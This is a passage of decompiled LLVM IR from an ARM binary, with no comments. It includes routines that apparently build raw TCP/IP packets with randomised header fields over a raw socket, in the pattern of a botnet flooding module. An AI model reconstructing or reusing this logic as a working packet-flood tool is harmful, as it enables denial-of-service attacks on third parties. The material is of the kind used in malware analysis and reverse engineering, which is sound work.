  store i32 %v2_8de4, i32* %r1.global-to-local, align 4
  store i32 %v0_8de0, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_8df0 = load i32, i32* @r7, align 4
  store i32 %v0_8df0, i32* %r0.global-to-local, align 4
  %v3_8df4 = call i32 @function_10388(i32 %v0_8df0, i32 %v2_8de4, i32 4)
  %v0_8df8 = load i32, i32* @r7, align 4
  %v1_8df8 = add i32 %v0_8df8, 6
  store i32 %v1_8df8, i32* %r0.global-to-local, align 4
  store i32 %v2_8dfc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_8e04 = call i32 @function_10388(i32 %v1_8df8, i32 %v2_8dfc, i32 4)
  %v0_8e08 = load i32, i32* @r7, align 4
  %v1_8e08 = add i32 %v0_8e08, 4
  store i32 %v1_8e08, i32* %r0.global-to-local, align 4
  store i32 %v2_8e0c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e14 = call i32 @function_10388(i32 %v1_8e08, i32 %v2_8e0c, i32 2)
  store i32 %v2_8e18, i32* %r1.global-to-local, align 4
  %v0_8e1c = load i32, i32* @r7, align 4
  %v1_8e1c = add i32 %v0_8e1c, 10
  store i32 %v1_8e1c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e24 = call i32 @function_10388(i32 %v1_8e1c, i32 %v2_8e18, i32 2)
  store i32 %v3_8e24, i32* %r0.global-to-local, align 4
  store i32 %v1_8a74, i32* %r1.global-to-local, align 4
  store i1 %v2_8e2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e2c, label %dec_label_pc_8e34, label %dec_label_pc_8fbc

dec_label_pc_8e34:                                ; preds = %dec_label_pc_8dd0, %dec_label_pc_8fbc
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_8e38 = load i32, i32* @r5, align 4
  %v3_8e38 = add i32 %v2_8e38, 10
  %v4_8e38 = inttoptr i32 %v3_8e38 to i16*
  store i16 0, i16* %v4_8e38, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e40 = load i32, i32* @r5, align 4
  store i32 %v0_8e40, i32* @r0, align 4
  %v2_8e44 = call i32 @function_c848(i32 %v0_8e40, i32 20)
  %v3_8e44 = trunc i32 %v2_8e44 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_8e4c = load i32, i32* @r5, align 4
  %v4_8e4c = add i32 %v3_8e4c, 10
  %v5_8e4c = inttoptr i32 %v4_8e4c to i16*
  store i16 %v3_8e44, i16* %v5_8e4c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e54 = load i32, i32* %r3.global-to-local, align 4
  %v1_8e54 = trunc i32 %v0_8e54 to i16
  %v2_8e54 = load i32, i32* @r6, align 4
  %v3_8e54 = add i32 %v2_8e54, 10
  %v4_8e54 = inttoptr i32 %v3_8e54 to i16*
  store i16 %v1_8e54, i16* %v4_8e54, align 2
  %v0_8e58 = load i32, i32* @r6, align 4
  store i32 %v0_8e58, i32* @r0, align 4
  %v2_8e5c = call i32 @function_c848(i32 %v0_8e58, i32 20)
  %v3_8e5c = trunc i32 %v2_8e5c to i16
  store i32 %v2_8e5c, i32* %r0.global-to-local, align 4
  %v3_8e60 = load i32, i32* @r6, align 4
  %v4_8e60 = add i32 %v3_8e60, 10
  %v5_8e60 = inttoptr i32 %v4_8e60 to i16*
  store i16 %v3_8e5c, i16* %v5_8e60, align 2
  store i32 0, i32* @r4, align 4
  %v0_8e68 = load i32, i32* @r8, align 4
  store i32 %v0_8e68, i32* @r1, align 4
  %v1_8e6c = add i32 %v0_8e68, 4
  %v2_8e6c = inttoptr i32 %v1_8e6c to i16*
  %v3_8e6c = load i16, i16* %v2_8e6c, align 2
  %v4_8e6c = zext i16 %v3_8e6c to i32
  store i32 %v4_8e6c, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_8e74 = add i32 %v0_8e68, 6
  %v4_8e74 = inttoptr i32 %v3_8e74 to i16*
  store i16 0, i16* %v4_8e74, align 2
  %v0_8e78 = load i32, i32* @r6, align 4
  store i32 %v0_8e78, i32* %r0.global-to-local, align 4
  %v4_8e7c = call i32 @function_c898(i32 %v0_8e78, i32 %v0_8e68, i32 %v4_8e6c, i32 %stack_var_-136.0.ph)
  %v5_8e7c = trunc i32 %v4_8e7c to i16
  store i32 %v4_8e7c, i32* %r0.global-to-local, align 4
  %v3_8e80 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8e80, i32* %r2.global-to-local, align 4
  %v3_8e84 = mul i32 %v3_8e80, 32
  store i32 %v3_8e84, i32* %r3.global-to-local, align 4
  %v0_8e88 = load i32, i32* @r5, align 4
  %v1_8e88 = add i32 %v0_8e88, 16
  %v2_8e88 = inttoptr i32 %v1_8e88 to i32*
  %v3_8e88 = load i32, i32* %v2_8e88, align 4
  %v5_8e8c = mul i32 %v3_8e80, 24
  store i32 %v5_8e8c, i32* %r3.global-to-local, align 4
  %v1_8e90 = load i32, i32* @sb, align 4
  %v2_8e90 = add i32 %v1_8e90, %v5_8e8c
  store i32 %v2_8e90, i32* @lr, align 4
  %v2_8e94 = add i32 %v2_8e90, 4
  %v3_8e94 = inttoptr i32 %v2_8e94 to i32*
  store i32 %v3_8e88, i32* %v3_8e94, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8e9c = load i32, i32* @r8, align 4
  %v4_8e9c = add i32 %v3_8e9c, 6
  %v5_8e9c = inttoptr i32 %v4_8e9c to i16*
  store i16 %v5_8e7c, i16* %v5_8e9c, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_8ea4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8ea4 = trunc i32 %v0_8ea4 to i16
  %v2_8ea4 = load i32, i32* %r3.global-to-local, align 4
  %v3_8ea4 = load i32, i32* @sb, align 4
  %v4_8ea4 = add i32 %v3_8ea4, %v2_8ea4
  %v5_8ea4 = inttoptr i32 %v4_8ea4 to i16*
  store i16 %v1_8ea4, i16* %v5_8ea4, align 2
  %v0_8ea8 = load i32, i32* @r4, align 4
  %v1_8ea8 = trunc i32 %v0_8ea8 to i16
  %v2_8ea8 = load i32, i32* @lr, align 4
  %v3_8ea8 = add i32 %v2_8ea8, 2
  %v4_8ea8 = inttoptr i32 %v3_8ea8 to i16*
  store i16 %v1_8ea8, i16* %v4_8ea8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8eb0 = load i32, i32* @r5, align 4
  store i32 %v0_8eb0, i32* %r1.global-to-local, align 4
  store i32 %v3_8abc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_8ebc = load i32, i32* @lr, align 4
  %v0_8ec0 = load i32, i32* %ip.global-to-local, align 4
  %v6_8ec4 = call i32 @function_11560(i32 %v3_8abc, i32 %v0_8eb0, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_8ebc, i32 %v0_8ec0)
  %v3_8ec8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8ec8, i32* %r3.global-to-local, align 4
  %v1_8ecc = add i32 %v3_8ec8, 1
  store i32 %v1_8ecc, i32* %r0.global-to-local, align 4
  %v1_8ed0 = load i32, i32* @sl, align 4
  %v9_8ed0 = icmp eq i32 %v1_8ecc, %v1_8ed0
  store i1 %v9_8ed0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8ecc, i32* %stack_var_-44, align 4
  %v6_8ed8 = icmp slt i32 %v1_8ecc, %v1_8ed0
  br i1 %v6_8ed8, label %dec_label_pc_8d5c, label %dec_label_pc_8d48

dec_label_pc_8ee0:                                ; preds = %dec_label_pc_8d5c
  %v1_8ee0 = add i32 %v2_8d64, 16
  %v2_8ee0 = inttoptr i32 %v1_8ee0 to i32*
  %v3_8ee0 = load i32, i32* %v2_8ee0, align 4
  store i32 %v3_8ee0, i32* %r4.global-to-local, align 4
  %v0_8ee4 = call i32 @function_e0b4()
  store i32 %v0_8ee4, i32* %r0.global-to-local, align 4
  %v3_8ee8 = load i32, i32* %stack_var_-44, align 4
  %v5_8ef0 = mul i32 %v3_8ee8, 24
  %v0_8ef4 = load i32, i32* %r4.global-to-local, align 4
  %v1_8ef4 = and i32 %v0_8ef4, 16711680
  store i32 %v1_8ef4, i32* %ip.global-to-local, align 4
  %v3_8ef8 = udiv i32 %v0_8ef4, 16777216
  %v4_8efc = udiv i32 %v1_8ef4, 256
  %v5_8efc = or i32 %v4_8efc, %v3_8ef8
  store i32 %v5_8efc, i32* %r2.global-to-local, align 4
  %v1_8f00 = load i32, i32* @sb, align 4
  %v2_8f00 = add i32 %v1_8f00, %v5_8ef0
  store i32 %v2_8f00, i32* %r1.global-to-local, align 4
  %v1_8f04 = and i32 %v0_8ef4, 65280
  store i32 %v1_8f04, i32* %r3.global-to-local, align 4
  %v1_8f08 = add i32 %v2_8f00, 20
  %v2_8f08 = inttoptr i32 %v1_8f08 to i8*
  %v3_8f08 = load i8, i8* %v2_8f08, align 1
  %v4_8f08 = zext i8 %v3_8f08 to i32
  store i32 %v4_8f08, i32* %ip.global-to-local, align 4
  %v5_8f10 = call i32 @llvm.bswap.i32(i32 %v0_8ef4)
  %v7_8f14 = lshr i32 %v0_8ee4, %v4_8f08
  %v8_8f14 = add i32 %v7_8f14, %v5_8f10
  store i32 %v8_8f14, i32* %r2.global-to-local, align 4
  %v1_8f18 = and i32 %v8_8f14, 16711680
  store i32 %v1_8f18, i32* %r0.global-to-local, align 4
  store i32 %v6_8aa8, i32* %r1.global-to-local, align 4
  %v5_8f30 = call i32 @llvm.bswap.i32(i32 %v8_8f14)
  store i32 %v5_8f30, i32* %r3.global-to-local, align 4
  store i1 %v7_8d8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f38 = load i32, i32* @r5, align 4
  %v2_8f38 = add i32 %v1_8f38, 16
  %v3_8f38 = inttoptr i32 %v2_8f38 to i32*
  store i32 %v5_8f30, i32* %v3_8f38, align 4
  br i1 %v2_8d8c, label %dec_label_pc_8f40, label %dec_label_pc_8d94

dec_label_pc_8f40:                                ; preds = %dec_label_pc_8ee0, %dec_label_pc_8d88
  %v0_8f40 = call i32 @function_e0b4()
  store i32 %v0_8f40, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8f4c = load i32, i32* @fp, align 4
  %v9_8f4c = icmp eq i32 %v0_8f4c, 65535
  store i1 %v9_8f4c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f50 = load i32, i32* @r5, align 4
  %v2_8f50 = add i32 %v1_8f50, 12
  %v3_8f50 = inttoptr i32 %v2_8f50 to i32*
  store i32 %v0_8f40, i32* %v3_8f50, align 4
  br i1 %v9_8f4c, label %dec_label_pc_8f58, label %dec_label_pc_8f40.dec_label_pc_8da4_crit_edge

dec_label_pc_8f40.dec_label_pc_8da4_crit_edge:    ; preds = %dec_label_pc_8f40
  %v1_8da8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8da4

dec_label_pc_8f58:                                ; preds = %dec_label_pc_8f40, %dec_label_pc_8d94
  %v0_8f58 = call i32 @function_e0b4()
  %v3_8f60 = urem i32 %v0_8f58, 65536
  store i32 %v3_8f60, i32* %r0.global-to-local, align 4
  store i32 %v3_8b08, i32* %r2.global-to-local, align 4
  %v1_8f6c = sub nsw i32 999, %v3_8f60
  store i32 %v1_8f6c, i32* %r3.global-to-local, align 4
  %v1_8f70 = load i32, i32* %r4.global-to-local, align 4
  %v9_8f70 = icmp eq i32 %v3_8b08, %v1_8f70
  store i1 %v9_8f70, i1* %cpsr_z.global-to-local, align 1
  %v1_8f74 = trunc i32 %v0_8f58 to i16
  %v2_8f74 = load i32, i32* @r5, align 4
  %v3_8f74 = add i32 %v2_8f74, 4
  %v4_8f74 = inttoptr i32 %v3_8f74 to i16*
  store i16 %v1_8f74, i16* %v4_8f74, align 2
  %v0_8f78 = load i32, i32* %r3.global-to-local, align 4
  %v1_8f78 = trunc i32 %v0_8f78 to i16
  %v2_8f78 = load i32, i32* @r6, align 4
  %v3_8f78 = add i32 %v2_8f78, 4
  %v4_8f78 = inttoptr i32 %v3_8f78 to i16*
  store i16 %v1_8f78, i16* %v4_8f78, align 2
  br i1 %v9_8f70, label %dec_label_pc_8f80, label %dec_label_pc_8f58.dec_label_pc_8db0_crit_edge

dec_label_pc_8f58.dec_label_pc_8db0_crit_edge:    ; preds = %dec_label_pc_8f58
  %v1_8db4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8db0

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f58, %dec_label_pc_8da4
  %v0_8f80 = call i32 @function_e0b4()
  %v1_8f80 = trunc i32 %v0_8f80 to i16
  store i32 %v0_8f80, i32* %r0.global-to-local, align 4
  store i32 %v3_8b0c, i32* %r3.global-to-local, align 4
  %v1_8f88 = load i32, i32* %r4.global-to-local, align 4
  %v9_8f88 = icmp eq i32 %v3_8b0c, %v1_8f88
  store i1 %v9_8f88, i1* %cpsr_z.global-to-local, align 1
  %v3_8f8c = load i32, i32* @r5, align 4
  %v4_8f8c = add i32 %v3_8f8c, 58
  %v5_8f8c = inttoptr i32 %v4_8f8c to i16*
  store i16 %v1_8f80, i16* %v5_8f8c, align 2
  br i1 %v9_8f88, label %dec_label_pc_8f94, label %dec_label_pc_8dbc

dec_label_pc_8f94:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8db0
  %v0_8f94 = call i32 @function_e0b4()
  %v1_8f94 = trunc i32 %v0_8f94 to i16
  store i32 %v0_8f94, i32* %r0.global-to-local, align 4
  store i32 %v1_8b00, i32* @r4, align 4
  store i1 %v2_8f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f9c, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_8f94
  %v3_8fa432 = load i32, i32* @r8, align 4
  %v4_8fa433 = add i32 %v3_8fa432, 2
  %v5_8fa434 = inttoptr i32 %v4_8fa433 to i16*
  store i16 %v1_8f94, i16* %v5_8fa434, align 2
  br label %dec_label_pc_8fb0

bb88:                                             ; preds = %dec_label_pc_8f94
  %v1_8fa0 = load i32, i32* @r5, align 4
  %v2_8fa0 = add i32 %v1_8fa0, 16
  %v3_8fa0 = inttoptr i32 %v2_8fa0 to i32*
  %v4_8fa0 = load i32, i32* %v3_8fa0, align 4
  store i32 %v4_8fa0, i32* %r3.global-to-local, align 4
  %v3_8fa4 = load i32, i32* @r8, align 4
  %v4_8fa4 = add i32 %v3_8fa4, 2
  %v5_8fa4 = inttoptr i32 %v4_8fa4 to i16*
  store i16 %v1_8f94, i16* %v5_8fa4, align 2
  %v1_8fa8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fa8 = load i32, i32* @r6, align 4
  %v3_8fa8 = add i32 %v2_8fa8, 16
  %v4_8fa8 = inttoptr i32 %v3_8fa8 to i32*
  store i32 %v1_8fa8, i32* %v4_8fa8, align 4
  br label %dec_label_pc_8dd0

dec_label_pc_8fb0:                                ; preds = %.thread31, %dec_label_pc_8dbc
  %v0_8fb0 = call i32 @function_e0b4()
  store i32 %v0_8fb0, i32* %r0.global-to-local, align 4
  %v1_8fb4 = load i32, i32* @r6, align 4
  %v2_8fb4 = add i32 %v1_8fb4, 16
  %v3_8fb4 = inttoptr i32 %v2_8fb4 to i32*
  store i32 %v0_8fb0, i32* %v3_8fb4, align 4
  br label %dec_label_pc_8dd0

dec_label_pc_8fbc:                                ; preds = %dec_label_pc_8dd0
  %v0_8fbc = load i32, i32* @r8, align 4
  %v1_8fbc = add i32 %v0_8fbc, 8
  store i32 %v1_8fbc, i32* %r0.global-to-local, align 4
  store i32 %v6_8a54, i32* %r1.global-to-local, align 4
  %v2_8fc4 = inttoptr i32 %v1_8fbc to i16*
  %v3_8fc4 = call i32 @function_e248(i16* %v2_8fc4, i32 %v6_8a54)
  store i32 %v3_8fc4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8e34

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_8acc
  store i32 %v3_8abc, i32* %r0.global-to-local, align 4
  %v1_8fd0 = call i32 @function_10dd8(i32 %v3_8abc)
  store i32 %v1_8fd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_896c, %dec_label_pc_8fcc
  %v1_8fdc = phi i32 [ %v3_8abc, %dec_label_pc_896c ], [ %v1_8fd0, %dec_label_pc_8fcc ]
  store i32 %v3_896c, i32* %r4.global-to-local, align 4
  store i32 %v6_896c, i32* %r5.global-to-local, align 4
  store i32 %v24_896c, i32* %fp.global-to-local, align 4
  ret i32 %v1_8fdc

dec_label_pc_8fe0:                                ; preds = %dec_label_pc_8af4
  %v1_8fe8 = add i32 %v6_8a54, 8
  store i32 %v1_8fe8, i32* %r1.global-to-local, align 4
  %v1_8fec = add i32 %v6_8a54, 66
  store i32 %v1_8fec, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8d48.preheader

; uselistorder directives
  uselistorder i32 %v1_8fec, { 1, 0 }
  uselistorder i32 %v1_8fe8, { 1, 0 }
  uselistorder i16 %v1_8f94, { 1, 0 }
  uselistorder i32 %v0_8f94, { 1, 0 }
  uselistorder i32 %v0_8f80, { 1, 0 }
  uselistorder i32 %v3_8f60, { 1, 0 }
  uselistorder i32 %v0_8f58, { 1, 0 }
  uselistorder i32 %v5_8f30, { 1, 0 }
  uselistorder i32 %v0_8ef4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8ed0, { 1, 2, 0 }
  uselistorder i32 %v1_8ecc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_8e80, { 1, 0, 2 }
  uselistorder i32 %v4_8e7c, { 1, 0 }
  uselistorder i32 %v0_8e68, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8e5c, { 1, 0 }
  uselistorder i32 %v7_8d70, { 2, 1, 0, 3 }
  uselistorder i1 %v7_8d8c, { 2, 1, 0 }
  uselistorder i1 %v2_8f9c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8ce0, { 1, 0, 2 }
  uselistorder i32 %v3_8b5c, { 1, 0 }
  uselistorder i32 %v3_8b40, { 1, 2, 0 }
  uselistorder i32 %v1_8b3c, { 1, 0 }
  uselistorder i32 %v1_8b00, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8afc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8af8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8af4, { 1, 0, 2, 3 }
  uselistorder i1 %v7_8aec, { 1, 0 }
  uselistorder i1 %v7_8ac0, { 1, 0 }
  uselistorder i32 %v3_8abc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_8aa8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_8a74, { 1, 2, 3, 0 }
  uselistorder i32 %v6_8a54, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8a08, { 1, 2, 0 }
  uselistorder i32 %v1_89e4, { 3, 2, 1, 0 }
  uselistorder i32 %v6_89dc, { 1, 0 }
  uselistorder i32 %v6_89a0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8988, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 28, 27, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 4, 8, 9, 11, 12, 10, 14, 13, 16, 15, 17, 3, 18, 19, 21, 20, 22, 23, 24, 25, 27, 26, 5, 28, 29, 32, 30, 31, 2, 1, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8fd4, { 1, 0 }
  uselistorder label %dec_label_pc_8e34, { 1, 0 }
  uselistorder label %dec_label_pc_8dd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8d48.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @function_9000(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9000:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9000 = load i32, i32* @r4, align 4
  %v6_9000 = load i32, i32* @r5, align 4
  %v24_9000 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_901c = call i32 @function_1214c(i32 %arg1, i32 4)
  %v0_9020 = load i32, i32* @r5, align 4
  store i32 %v0_9020, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9030 = load i32, i32* @r4, align 4
  %v5_9034 = inttoptr i32 %v0_9020 to i32*
  %v6_9034 = call i32 @function_8570(i32 %v0_9030, i32* %v5_9034, i32 2, i32 0, i32 %v2_901c)
  %v1_9040 = urem i32 %v6_9034, 256
  store i32 %v1_9040, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_904c = load i32, i32* @r5, align 4
  store i32 %v0_904c, i32* %r1.global-to-local, align 4
  %v0_9050 = load i32, i32* @r4, align 4
  %v5_9054 = trunc i32 %v6_9034 to i8
  %v6_9058 = inttoptr i32 %v0_904c to i32*
  %v7_9058 = call i32 @function_8570(i32 %v0_9050, i32* %v6_9058, i32 3, i32 65535, i32 %v6_9034)
  %v0_905c = load i32, i32* @r5, align 4
  store i32 %v0_905c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9058, i32* %fp.global-to-local, align 4
  %v0_906c = load i32, i32* @r4, align 4
  %v5_9070 = inttoptr i32 %v0_905c to i32*
  %v6_9070 = call i32 @function_8570(i32 %v0_906c, i32* %v5_9070, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_9078 = urem i32 %v6_9070, 256
  store i32 %v1_9078, i32* %ip.global-to-local, align 4
  %v0_907c = load i32, i32* @r5, align 4
  store i32 %v0_907c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9088 = load i32, i32* @r4, align 4
  %v6_9090 = inttoptr i32 %v0_907c to i32*
  %v7_9090 = call i32 @function_8570(i32 %v0_9088, i32* %v6_9090, i32 5, i32 1, i32 %v1_9078)
  %v1_909c = urem i32 %v7_9090, 256
  store i32 %v1_909c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_90a8 = load i32, i32* @r5, align 4
  store i32 %v0_90a8, i32* %r1.global-to-local, align 4
  %v0_90ac = load i32, i32* @r4, align 4
  %v5_90b4 = inttoptr i32 %v0_90a8 to i32*
  %v6_90b4 = call i32 @function_8570(i32 %v0_90ac, i32* %v5_90b4, i32 6, i32 65535, i32 %v1_909c)
  %v0_90bc = load i32, i32* @r5, align 4
  store i32 %v0_90bc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_90b4, i32* @r8, align 4
  %v0_90cc = load i32, i32* @r4, align 4
  %v5_90d0 = inttoptr i32 %v0_90bc to i32*
  %v6_90d0 = call i32 @function_8570(i32 %v0_90cc, i32* %v5_90d0, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_90d4 = load i32, i32* @r5, align 4
  store i32 %v0_90d4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_90d0, i32* @r7, align 4
  %v0_90e4 = load i32, i32* @r4, align 4
  %v5_90e8 = inttoptr i32 %v0_90d4 to i32*
  %v6_90e8 = call i32 @function_8570(i32 %v0_90e4, i32* %v5_90e8, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_90f8 = load i32, i32* @r5, align 4
  store i32 %v0_90f8, i32* %r1.global-to-local, align 4
  %v0_90fc = load i32, i32* @r4, align 4
  %v5_9100 = inttoptr i32 %v0_90f8 to i32*
  %v6_9100 = call i32 @function_8570(i32 %v0_90fc, i32* %v5_9100, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9108 = urem i32 %v6_9100, 256
  store i32 %v1_9108, i32* %ip.global-to-local, align 4
  %v0_910c = load i32, i32* @r5, align 4
  store i32 %v0_910c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9118 = load i32, i32* @r4, align 4
  %v5_9120 = inttoptr i32 %v0_910c to i32*
  %v6_9120 = call i32 @function_8570(i32 %v0_9118, i32* %v5_9120, i32 19, i32 0, i32 %v1_9108)
  %v0_9128 = load i32, i32* @r5, align 4
  store i32 %v0_9128, i32* %r1.global-to-local, align 4
  %v2_912c = load i32, i32* @global_var_20a4c.46, align 4
  store i32 %v2_912c, i32* %r3.global-to-local, align 4
  store i32 %v6_9120, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9138 = load i32, i32* @r4, align 4
  %v5_913c = inttoptr i32 %v0_9128 to i32*
  %v6_913c = call i32 @function_8570(i32 %v0_9138, i32* %v5_913c, i32 25, i32 %v2_912c, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9150 = call i32 @function_115e4(i32 2, i32 3, i32 6)
  %v7_9154 = icmp eq i32 %v3_9150, -1
  store i1 %v7_9154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9154, label %dec_label_pc_95f4, label %dec_label_pc_9160

dec_label_pc_9160:                                ; preds = %dec_label_pc_9000
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9168 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9168, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_917c = call i32 @function_115a0(i32 %v3_9150, i32 0, i32 3, i32 %v6_9168, i32 4)
  %v7_9180 = icmp eq i32 %v5_917c, -1
  store i1 %v7_9180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9180, label %dec_label_pc_95ec, label %dec_label_pc_9188

dec_label_pc_9188:                                ; preds = %dec_label_pc_9160
  %v0_9188 = load i32, i32* @r8, align 4
  %v0_918c = load i32, i32* @r7, align 4
  %v0_9190 = load i32, i32* %fp.global-to-local, align 4
  %v0_9194 = load i32, i32* @r6, align 4
  %v1_9194 = urem i32 %v0_9194, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_919c = urem i32 %v0_9188, 65536
  store i32 %v3_919c, i32* %r3.global-to-local, align 4
  %v3_91a0 = urem i32 %v0_918c, 65536
  store i32 %v3_91a0, i32* %r4.global-to-local, align 4
  %v0_91a4 = load i32, i32* @sl, align 4
  %v2_91a4 = icmp eq i32 %v0_91a4, 0
  store i1 %v2_91a4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_91bc = urem i32 %v0_9190, 65536
  store i32 %v3_91bc, i32* @fp, align 4
  br i1 %v2_91a4, label %dec_label_pc_9600, label %dec_label_pc_91cc

dec_label_pc_91cc:                                ; preds = %dec_label_pc_9188
  %v3_918c = mul i32 %v0_918c, 65536
